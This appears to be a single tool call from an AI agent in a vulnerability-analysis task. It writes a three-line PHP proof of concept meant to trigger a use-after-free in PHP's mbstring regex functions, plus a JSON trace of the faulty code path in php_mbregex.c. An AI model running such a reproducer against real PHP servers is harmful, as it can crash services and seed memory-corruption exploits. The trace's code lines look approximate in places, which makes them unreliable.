message:
Command `cd /workspace && cat > poc.php <<'EOF'
<?php
mb_ereg_search_init('', '2');
mb_eregi_replace('2', '', '');
mb_ereg_search_pos();
?>
EOF
python3 - <<'PY'
import json
trace = [
  {"step":1,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1400,"var":"MBREX(search_re)","code":"if (argc > 1) { MBREX(search_re) = php_mbregex_compile_pattern(...); }","note":"User-controlled pattern '2' is compiled and stored in module-global search state for later reuse."},
  {"step":2,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_ereg_search_init)","line":1410,"var":"MBREX(search_str)","code":"ZVAL_STR_COPY(&MBREX(search_str), arg_str);","note":"The attacker-controlled search string is copied into module-global state, making the search context persistent across calls."},
  {"step":3,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"PHP_FUNCTION(mb_eregi_replace)","line":1120,"var":"MBREX(search_re)","code":"onig_free(regs); onig_region_free(regs, 1); smart_str_free(...);","note":"A separate mbstring regex API runs and can clear or replace regex-related module globals while the search context still exists."},
  {"step":4,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1470,"var":"MBREX(search_re)","code":"if (MBREX(search_re) == NULL) { php_error_docref(NULL, E_WARNING, \"No regex given\"); RETURN_FALSE; }","note":"The subsequent search call relies on the module-global regex pointer remaining valid after the prior API call."},
  {"step":5,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1458,"var":"MBREX(search_regs)","code":"if (MBREX(search_regs)) { onig_region_free(MBREX(search_regs), 1); } MBREX(search_regs) = onig_region_new();","note":"The search routine frees and reallocates region state, exposing stale state if earlier APIs invalidated related globals."},
  {"step":6,"file":"src-vul/php-src/ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1462,"var":"str + pos","code":"err = _php_mb_onig_search(MBREX(search_re), str, str + len, str + pos, str + len, MBREX(search_regs), 0);","note":"The search engine is invoked using the module-global regex state that can have been freed or invalidated, causing the UAF read in the sanitizer report."}
]
with open('/workspace/candidate_trace.json','w') as f:
    json.dump(trace,f,separators=(',',':'))
PY
ls -l /workspace/poc.php /workspace/candidate_trace.json && python3 - <<'PY'
from pathlib import Path
print(Path('/workspace/candidate_trace.json').read_text())
PY` executed with exit code 0.
